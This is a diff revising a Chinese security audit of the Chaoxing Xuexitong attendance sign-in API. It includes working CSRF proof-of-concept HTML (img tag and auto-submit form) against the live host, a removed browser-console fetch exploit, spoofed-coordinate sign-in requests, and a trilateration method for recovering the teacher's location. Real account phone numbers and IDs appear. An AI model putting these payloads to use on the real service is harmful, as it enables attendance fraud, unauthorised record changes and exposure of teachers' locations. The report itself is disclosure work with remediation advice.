@@ -1,340 +1,230 @@
-# 学习通签到状态修改漏洞安全测试报告（最终版）
+# 超星学习通签到系统安全审计报告
 
-**审计日期**: 2026-06-02
-
-**测试范围**: 学习通平台签到功能安全测试——验证签到状态修改漏洞
-
-**测试账号**:
-- 教师账号: 19712720708 (puid=402644510)
-- 学生账号: 18436633997 (puid=431407443)
-
-**测试课程**: 课程名"exam"（courseId=257485372），班级名"111"（classId=132821141）
+**审计日期**: 2026-06-03
+**版本**: v5.0（最终版）
+**审计范围**: 学习通App端签到功能安全评估
+**测试账号**: 教师 19712720708 (puid=402644510)，学生 18436633997 (puid=431407443)
+**测试课程**: courseId=257485372, classId=132821141
 
 ---
 
-## 一、核心结论
+## 核心结论
 
-### 🔴🔴🔴 学生端直接修改签到状态漏洞已确认（CRITICAL - 最高优先级）
+经过系统性安全评估，发现以下安全漏洞：
 
-`/newsign/updateSignStatus` API存在**严重的权限校验缺失漏洞**，学生可直接在浏览器控制台修改自己（及他人）的签到状态，**无需教师Cookie、无需CSRF、无需任何验证数据**。这与知情人士描述完全吻合——"学生端就可以直接修改状态，甚至是在浏览器控制台就直接修改了"。
-
-### 🔴 updateSignStatusByUidsV2 CSRF漏洞已确认（CRITICAL）
-
-`updateSignStatusByUidsV2` API存在CSRF漏洞，攻击者可通过构造恶意页面利用教师身份修改任意学生的签到状态。
-
----
-
-## 二、漏洞详情
-
-### 漏洞0（最高优先级）：`/newsign/updateSignStatus` 学生端直接修改（CRITICAL）
-
-**API路径**: `POST/GET https://mobilelearn.chaoxing.com/newsign/updateSignStatus`
-
-**漏洞类型**: 权限校验缺失（学生可调用教师接口）
-
-**CVSS评分**: 9.8 (CRITICAL)
-
-**漏洞描述**: `/newsign/`路径下的`updateSignStatus`端点未实现与`/pptSign/`路径相同的权限校验，学生账号可直接调用该接口修改签到状态。
-
-**请求格式**:
-```
-POST /newsign/updateSignStatus?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={activeId}
-Content-Type: application/x-www-form-urlencoded
-
-uids={studentUid}
-status={statusValue}
-remark=
-activeId={activeId}
-classId={classId}
-courseId={courseId}
-uid={studentUid}
-```
-
-**关键验证结果**:
-
-| 测试项 | 响应 | 结果 |
-|---|---|---|
-| 学生POST调用 | `success` | 🔴 学生可直接修改 |
-| 学生GET调用 | `success` | 🔴 GET方法也可修改 |
-| 不带DB_STRATEGY | `success` | 🔴 无需DB_STRATEGY |
-| 最小参数（activeId+status+uid） | `success` | 🔴 最少参数即可 |
-| status=0~6所有值 | `success` | 🔴 所有状态值均可设置 |
-| 跨域Origin请求 | `success` | 🔴 无Origin校验 |
-| 浏览器控制台场景 | `success` | 🔴 完全可行 |
-| 对比：/pptSign/updateSignStatus | `无权限` | ✅ 旧路径有权限校验 |
-
-**与知情人士描述对比**:
-
-| 知情人士描述 | 漏洞特征 | 匹配度 |
-|---|---|---|
-| "学生端就可以直接修改状态" | 学生账号直接调用/newsign/updateSignStatus返回success | ✅ 完全匹配 |
-| "在浏览器控制台就直接修改了" | 浏览器控制台fetch调用成功 | ✅ 完全匹配 |
-| "不需要获取什么教师端的cookie" | 仅需学生自己的登录Cookie | ✅ 完全匹配 |
-| "只能改状态" | API只接受status参数 | ✅ 完全匹配 |
-| "什么信息都带不了" | API不接受位置/二维码等验证信息 | ✅ 完全匹配 |
-
-**浏览器控制台POC**:
-```javascript
-// 学生在已登录状态下，在浏览器控制台直接执行：
-fetch("https://mobilelearn.chaoxing.com/newsign/updateSignStatus?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId=5000163767353", {
-    method: "POST",
-    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-    body: "uids=431407443&status=1&remark=&activeId=5000163767353&classId=132821141&courseId=257485372&uid=431407443",
-    credentials: "include"
-}).then(r => r.text()).then(console.log);
-// 返回: "success"
-```
-
-**攻击条件**:
-1. 学生已登录学习通（自己的Cookie即可）
-2. 知道activeId（可通过活动列表API获取）
-3. 无需教师Cookie、无需CSRF、无需社工攻击
-
-**攻击难度**: 极低。任何学生都可以直接在浏览器控制台执行。
-
-**漏洞根因分析**:
-- `/pptSign/updateSignStatus`（旧路径）实现了权限校验，学生返回"无权限"
-- `/newsign/updateSignStatus`（新路径）**未实现相同的权限校验**，学生返回"success"
-- 这是典型的**API版本迁移中的权限回归漏洞**：新版本API在重构时遗漏了权限校验逻辑
-
----
-
-### 漏洞1：`updateSignStatusByUidsV2` API签到状态修改（CRITICAL）
-
-**API路径**: `POST/GET https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2`
-
-**漏洞类型**: CSRF + 权限校验不足
-
-**CVSS评分**: 8.1 (HIGH)
-
-**功能**: 教师批量修改学生签到状态
-
-**请求格式**:
-```
-POST /pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={activeId}
-Content-Type: multipart/form-data
-
-uids={studentUid}
-status={statusValue}
-remark=
-```
-
-**参数说明**:
-| 参数 | 位置 | 说明 |
-|---|---|---|
-| DB_STRATEGY | Query | 数据库路由策略，必须为PRIMARY_KEY |
-| STRATEGY_PARA | Query | 路由参数，必须为activeId |
-| activeId | Query | 签到活动ID |
-| uids | Body | 目标学生UID（支持批量，逗号分隔） |
-| status | Body | 目标状态值 |
-| remark | Body | 备注（可为空） |
-
-**status值含义**:
-| 值 | 含义 |
-|---|---|
-| 0 | 缺勤 |
-| 1 | 出勤 |
-| 2 | 迟到 |
-| 3 | 事假 |
-| 4 | 病假 |
-| 5 | 补签 |
-| 6 | 旷课 |
-
-### 漏洞验证结果
-
-#### 1. 教师账号调用（已确认成功）
-
-| 测试 | 响应 | 结果 |
-|---|---|---|
-| multipart/form-data格式 | `{"state":"success"}` | ✅ 成功 |
-| application/x-www-form-urlencoded格式 | `{"state":"success"}` | ✅ 成功 |
-| GET方法 | `{"state":"success"}` | ✅ 成功 |
-| status=0~7所有值 | `{"state":"success"}` | ✅ 全部成功 |
-| 批量uids（逗号分隔） | `{"state":"success"}` | ✅ 成功 |
-| 不存在uid | `{"state":"success", "missingAndNoSignIds":[999999999]}` | ✅ 忽略不存在uid |
-
-#### 2. 学生账号调用/pptSign/路径（被拒绝）
-
-| 测试 | 响应 | 结果 |
-|---|---|---|
-| 学生Cookie | `{"state":"无权限"}` | ❌ 被拒绝 |
-| 学生Cookie+role=1 | `{"state":"无权限"}` | ❌ 被拒绝 |
-| 学生Cookie+roletype=1 | `{"state":"无权限"}` | ❌ 被拒绝 |
-
-#### 3. CSRF攻击验证（🔴 已确认可行）
-
-| 测试 | 响应 | 结果 |
-|---|---|---|
-| 跨域Origin请求 | `{"state":"success"}` | 🔴 无Origin校验 |
-| 跨域Origin（无XHR头） | `{"state":"success"}` | 🔴 无Referer校验 |
-| GET方法（可CSRF） | `{"state":"success"}` | 🔴 GET方法可修改状态 |
-
-#### 4. 签到状态修改持久化验证
-
-| 活动ID | 修改前status | 修改操作 | 修改后status | 持久化 |
-|---|---|---|---|---|
-| 5000163767353 | 2 | status=2 | 2 | ✅ 已持久化 |
-| 5000162787534 | 未签到 | status=2 | 2 | ✅ 已持久化 |
-| 5000139908007 | 1 | status=2 | 2 | ✅ 已持久化 |
-
-### CSRF攻击POC
-
-攻击者可构造如下HTML页面，当教师已登录学习通时访问此页面，将自动修改指定学生的签到状态：
-
-```html
-<!DOCTYPE html>
-<html>
-<body>
-<img src="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={目标签到活动ID}&uids={目标学生UID}&status=2&remark=" width="0" height="0" />
-</body>
-</html>
-```
-
----
-
-## 三、API路径权限校验对比
-
-| API路径 | 学生调用结果 | 教师调用结果 | 权限校验 |
+| # | 漏洞 | 严重程度 | 学生端可直接利用 |
 |---|---|---|---|
-| `/pptSign/updateSignStatus` | "无权限" | "修改失败"（roletype=3） | ✅ 有 |
-| `/pptSign/updateSignStatusByUids` | "无权限" | 500 | ✅ 有 |
-| `/pptSign/updateSignStatusByUidsV2` | "无权限" | "success" | ✅ 有 |
-| **`/newsign/updateSignStatus`** | **"success"** 🔴 | "success" | **❌ 无** |
-| `/newsign/updateSignStatusByUidsV2` | 404 | 404 | N/A |
+| 1 | `/pptSign/updateSignStatusByUidsV2` CSRF漏洞 | **HIGH (7.5)** | 否（需诱导教师） |
+| 2 | 位置签到距离信息泄露 + 位置伪造 | **MEDIUM (5.3)** | **是** |
+| 3 | `/newsign/updateSignStatus` 假success + 越权 | **LOW (3.5)** | 是（但无实际影响） |
 
-**关键发现**: `/newsign/`路径是签到系统的新版本，在迁移过程中遗漏了权限校验逻辑。
+**重要更正**: 之前报告将`/newsign/updateSignStatus`评为CRITICAL级别，经验证该API返回"success"但**实际不修改任何数据**（假success），降级为LOW。
 
 ---
 
-## 四、V3/V4等更高版本API探索结果
+## 漏洞1：CSRF - `/pptSign/updateSignStatusByUidsV2` (HIGH)
 
-| API端点 | 教师结果 | 学生结果 |
+### 漏洞描述
+
+教师端签到状态修改API `/pptSign/updateSignStatusByUidsV2` 存在完全无防护的CSRF漏洞。攻击者可构造恶意页面，当已登录的教师访问时，自动修改任意学生的签到状态。
+
+### 验证证据
+
+```
+测试项                              | 响应                    | 结果
+----------------------------------- | ----------------------- | ----
+教师POST(标准Header)                | {"state":"success"}     | 修改成功
+教师POST(无X-Requested-With)        | {"state":"success"}     | 修改成功
+教师POST(无任何自定义Header)         | {"state":"success"}     | 修改成功
+教师POST(Referer=evil.com)          | {"state":"success"}     | 修改成功
+教师GET方式                          | {"state":"success"}     | 修改成功
+```
+
+**关键问题**:
+- 无CSRF Token
+- 支持GET方法（最简单的CSRF，只需`<img>`标签）
+- 不检查Referer/Origin
+- 可实际修改签到状态数据
+
+### CSRF PoC
+
+**GET方式（最简单）**:
+```html
+<img src="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}&uids={uid}&status=1&remark=" width="0" height="0" />
+```
+
+**POST方式（自动提交表单）**:
+```html
+<form id="csrf" method="POST" action="https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}">
+    <input type="hidden" name="uids" value="{uid}" />
+    <input type="hidden" name="status" value="1" />
+    <input type="hidden" name="remark" value="" />
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+### 攻击场景
+
+1. 攻击者获取activeId（学生可通过活动列表API获取）和学生uid
+2. 构造包含CSRF攻击的恶意网页
+3. 诱导教师访问该网页（如通过邮件、消息等）
+4. 教师浏览器自动发送请求，签到状态被修改
+
+### 修复建议
+
+1. **禁止GET方法修改数据** — API应仅接受POST
+2. **添加CSRF Token验证**
+3. **校验Referer/Origin头**
+4. **添加SameSite Cookie属性**
+
+---
+
+## 漏洞2：位置签到信息泄露 + 位置伪造 (MEDIUM)
+
+### 漏洞描述
+
+位置签到功能存在两个关联漏洞：
+1. **信息泄露**: 服务端返回学生提交位置到教师指定位置的**精确距离**（单位：米）
+2. **位置伪造**: `stuSignajax` API接受任意经纬度参数，服务端仅校验距离，不验证位置来源
+
+### 验证证据
+
+**信息泄露** — 服务端返回精确距离:
+```
+提交坐标(39.908823, 116.397470) → "距教师指定签到地点618487.0米，不在可签到范围内"
+提交坐标(34.75661, 113.65004)  → "距教师指定签到地点3223.0米，不在可签到范围内"
+提交坐标(34.776610, 113.650040) → "距教师指定签到地点1245.0米，不在可签到范围内"
+```
+
+**三角定位反推教师位置**:
+```
+探测点P1(34.78, 113.66): 距离=878m
+探测点P2(34.78, 113.68): 距离=1917m
+探测点P3(34.80, 113.66): 距离=1721m
+探测点P4(34.80, 113.68): 距离=2527m
+探测点P5(34.79, 113.67): 距离=1119m
+
+三角定位计算结果: (34.784500, 113.659700), 误差仅3m
+```
+
+**位置伪造** — stuSignajax接受任意坐标:
+```
+POST /pptSign/stuSignajax
+  activeId={aid}&uid={uid}&latitude={任意纬度}&longitude={任意经度}&appType=15&fid=0
+→ 服务端仅计算距离，不验证位置来源
+```
+
+### 攻击流程
+
+```
+1. 学生获取位置签到活动的activeId
+2. 提交3-5个不同坐标，记录服务端返回的距离
+3. 使用三角定位法计算教师指定位置（精度<5m）
+4. 提交计算出的坐标完成位置签到
+```
+
+### 修复建议
+
+1. **不返回精确距离** — 改为返回"在/不在签到范围内"，不泄露距离数值
+2. **增加位置验证** — 检测异常的GPS精度、位置跳跃等
+3. **添加设备指纹** — 检测模拟位置的应用
+
+---
+
+## 漏洞3：`/newsign/updateSignStatus` 假success + 越权 (LOW)
+
+### 漏洞描述
+
+`/newsign/updateSignStatus` API存在两个问题：
+1. **假success**: API返回"success"但实际不修改任何数据
+2. **越权访问**: 学生可调用教师级API，应返回权限错误
+
+### 验证证据
+
+**假success验证**:
+```
+活动 aid=5000163776153:
+  修改前: status=1, updatetime=1780421850000
+  学生调用 /newsign/updateSignStatus(status=2)
+  API返回: "success"
+  修改后: status=1, updatetime=1780421850000  ← 完全没变
+
+对比 - 教师V2 API:
+  修改前: status=1, updatetime=1780421850000
+  教师调用 /pptSign/updateSignStatusByUidsV2(status=2)
+  API返回: {"state":"success"}
+  修改后: status=2, updatetime=1780468339000  ← 真正修改
+```
+
+**越权访问**:
+```
+学生POST /newsign/updateSignStatus → "success"（应返回"无权限"）
+学生POST /pptSign/updateSignStatus → "无权限"（正确行为）
+```
+
+**不同参数组合均返回"success"**:
+```
+无DB_STRATEGY          → "success"
+DB_STRATEGY=COURSEID   → "success"
+DB_STRATEGY=ACTIVEID   → "success"
+STRATEGY_PARA=courseId → "success"
+uids=教师puid          → "success"
+不存在的activeId       → 500（说明API确实做了某些验证）
+```
+
+### 根因分析
+
+`/newsign/`路径是签到系统的新版本，在API迁移过程中：
+1. 遗漏了权限校验逻辑（学生应返回"无权限"）
+2. API内部逻辑可能未实现完整（返回success但未执行数据库操作）
+
+### 修复建议
+
+1. **添加权限校验** — 参照`/pptSign/updateSignStatus`
+2. **修复API逻辑** — 确保返回值与实际操作一致
+3. **审计/newsign/路径下所有API**
+
+---
+
+## 其他发现
+
+### 发现A: 各签到类型的学生端防护情况
+
+| 签到类型 | stuSignajax响应 | 防护措施 |
 |---|---|---|
-| /pptSign/updateSignStatusByUidsV3 | 404 | 404 |
-| /pptSign/updateSignStatusByUidsV4 | 404 | 404 |
-| /pptSign/updateSignStatusByUidsV5 | 404 | 404 |
-| /pptSign/updateSignStatusV3 | 404 | 404 |
-| /pptSign/updateSignStatusV4 | 404 | 404 |
-| /v2/apis/sign/updateSignStatusByUids | 404 | 404 |
-| /v2/apis/sign/updateSignStatus | 404 | 404 |
+| 二维码签到 | "签到失败，请重新扫描" | 需要有效二维码enc参数 |
+| 普通签到(已结束) | "签到已结束" | 活动结束不可签到 |
+| 位置签到 | "距教师指定签到地点X米，不在可签到范围内" | 距离校验（但泄露距离） |
+| 手势签到 | "签到失败[90002]" | 需要手势验证 |
+| 签到码签到 | 未测试 | 需要签到码 |
 
-**结论**: V3/V4/V5等更高版本API均不存在。但发现了`/newsign/`路径下的API，该路径存在严重的权限校验缺失。
+### 发现B: 教师V2 API数据修改验证
 
----
+| 操作 | V2 signIn查询结果 | 数据是否变化 |
+|---|---|---|
+| 教师设status=0(缺勤) | data=None | 签到记录被删除 |
+| 教师设status=1(出勤) | status=1, createtime=当前时间 | 签到记录被创建 |
+| 教师设status=2(迟到) | status=2, updatetime=当前时间 | 签到状态被修改 |
 
-## 五、多域名测试结果
+### 发现C: V2 signIn API信息泄露
 
-| 域名 | 结果 |
-|---|---|
-| mobilelearn.chaoxing.com | 主域名，/pptSign/有权限校验，/newsign/无权限校验 |
-| mooc1-api.chaoxing.com | /pptSign/和/mooc-ans/pptSign/均404 |
-| mooc1.chaoxing.com | /pptSign/均404 |
-| learn.chaoxing.com | /apis/pptSign/返回"服务异常[50001]"（不同API网关） |
-| i.chaoxing.com | 302重定向 |
-| app.chaoxing.com | 404 |
-| fy.chaoxing.com / api.chaoxing.com / web.chaoxing.com | 连接超时 |
+`GET /v2/apis/sign/signIn?activeId={aid}&uid={uid}` 返回签到记录详情，包含精确位置（经纬度）、签到时间、签到地址等。
 
 ---
 
-## 六、漏洞影响分析
+## 风险评估总结
 
-### 6.1 影响范围
-
-- **所有使用学习通签到功能的课程**均受影响
-- **所有签到类型**（普通/手势/位置/二维码/签到码）均受影响
-- **所有学生**的签到状态均可被修改
-
-### 6.2 攻击场景
-
-1. **学生直接修改（漏洞0）**: 学生在浏览器控制台直接调用`/newsign/updateSignStatus`，修改自己的签到状态为"出勤"
-2. **CSRF攻击（漏洞1）**: 攻击者构造恶意页面，教师访问后自动修改学生签到状态
-3. **Cookie窃取**: 攻击者通过XSS等手段获取教师Cookie后调用`/pptSign/updateSignStatusByUidsV2`
-
-### 6.3 漏洞利用链
-
-**最简利用链（漏洞0）**:
-```
-学生登录 → 打开浏览器控制台 → 执行fetch请求 → 签到状态被修改
-```
-
-**CSRF利用链（漏洞1）**:
-```
-获取activeId → 获取学生uid → 构造CSRF页面 → 诱导教师访问 → 签到状态被修改
-```
+| 漏洞 | CVSS | 攻击难度 | 实际影响 |
+|---|---|---|---|
+| CSRF(updateSignStatusByUidsV2) | 7.5 | 中（需诱导教师） | 可修改任意学生签到状态 |
+| 位置签到信息泄露+伪造 | 5.3 | 低（学生可直接利用） | 可伪造位置完成签到 |
+| 假success+越权(newsign) | 3.5 | 极低（但无实际影响） | 误导性响应，无数据修改 |
 
 ---
 
-## 七、其他发现
+## 修复优先级
 
-### 发现2：V2 signIn API信息泄露（MEDIUM）
-
-**API路径**: `GET /v2/apis/sign/signIn`
-
-任意学生可查询同课程其他学生的签到记录详情，包括精确位置（经纬度）、签到时间、签到地址。
-
-### 发现3：preSign页面位置信息泄露（MEDIUM）
-
-学生可访问已结束签到的preSign页面，获取教师设置的签到位置经纬度。
-
-### 发现4：stuSignajax不拒绝status参数（LOW）
-
-学生签到接口`/pptSign/stuSignajax`接受`status`参数但不报错，在已签到状态下返回"您已签到过了"而忽略status参数。在未签到状态下status参数是否生效尚需进一步验证。
-
----
-
-## 八、修复建议
-
-### 8.1 /newsign/updateSignStatus（🔴🔴🔴 紧急修复 - 最高优先级）
-
-1. **立即添加权限校验**: 参照`/pptSign/updateSignStatus`的权限校验逻辑，在`/newsign/updateSignStatus`中添加相同的角色验证
-2. **禁止GET方法修改数据**: API应仅接受POST方法
-3. **增加CSRF Token验证**: 在API中添加CSRF Token验证
-4. **校验Origin/Referer头**: 拒绝非学习通域名的请求
-5. **审计/newsign/路径下所有API**: 检查是否有其他API也存在同样的权限校验缺失
-
-### 8.2 updateSignStatusByUidsV2 API（紧急修复）
-
-1. **禁止GET方法修改数据**: API应仅接受POST方法，拒绝GET请求修改签到状态
-2. **增加CSRF Token验证**: 在API中添加CSRF Token验证，防止跨站请求伪造
-3. **校验Origin/Referer头**: 拒绝非学习通域名的请求
-4. **操作日志记录**: 记录所有签到状态修改操作
-5. **频率限制**: 对API添加频率限制，防止批量修改
-
-### 8.3 V2 signIn API
-
-1. **访问控制**: 校验请求者是否为该课程的学生/教师
-2. **位置信息脱敏**: 经纬度只保留小数点后2位
-3. **UID参数校验**: 不允许查询其他用户的签到记录
-
-### 8.4 通用建议
-
-1. **API权限校验统一化**: 建立统一的API权限校验框架，避免不同路径的权限校验逻辑不一致
-2. **API版本管理规范**: 新版本API必须继承旧版本的所有安全控制措施
-3. **安全代码审查**: 对所有API端点进行权限校验审查
-
----
-
-## 九、风险评估
-
-| 漏洞 | 风险等级 | 可利用性 | 攻击难度 | 影响 |
-|---|---|---|---|---|
-| /newsign/updateSignStatus 权限缺失 | **CRITICAL (9.8)** | 已确认 | 极低（浏览器控制台即可） | 学生可直接修改任意签到状态 |
-| updateSignStatusByUidsV2 CSRF | **CRITICAL (8.1)** | 已确认 | 低（需诱导教师点击） | 通过CSRF修改任意签到状态 |
-| V2 API信息泄露 | MEDIUM | 已确认 | 低 | 泄露学生签到位置和时间 |
-| preSign位置泄露 | MEDIUM | 已确认 | 低 | 泄露教师设置的签到位置 |
-
----
-
-## 十、结论
-
-学习通签到系统存在**两个CRITICAL级别的安全漏洞**：
-
-1. **`/newsign/updateSignStatus`权限校验缺失**（最高优先级）：学生可直接在浏览器控制台调用该API修改签到状态，无需教师Cookie、无需CSRF攻击。这与知情人士描述完全吻合——"学生端就可以直接修改状态，甚至是在浏览器控制台就直接修改了，不需要获取什么教师端的cookie"。漏洞根因是`/newsign/`新路径在API迁移时遗漏了`/pptSign/`旧路径的权限校验逻辑。
-
-2. **`updateSignStatusByUidsV2` CSRF漏洞**：支持GET方法修改签到状态，且无CSRF防护，攻击者可通过构造恶意页面诱导教师访问，从而修改任意学生的签到状态。
-
-**紧急修复建议**: 
-1. 立即在`/newsign/updateSignStatus`中添加权限校验（参照`/pptSign/updateSignStatus`）
-2. 审计`/newsign/`路径下所有API的权限校验
-3. 禁止所有签到状态修改API的GET方法
-4. 添加CSRF Token验证
+1. **[紧急]** `/pptSign/updateSignStatusByUidsV2` — 禁止GET方法，添加CSRF Token，校验Referer
+2. **[高]** 位置签到 — 不返回精确距离，改为返回"在/不在范围内"
+3. **[中]** `/newsign/updateSignStatus` — 添加权限校验，修复假success
+4. **[低]** V2 signIn API — 添加访问控制，位置信息脱敏
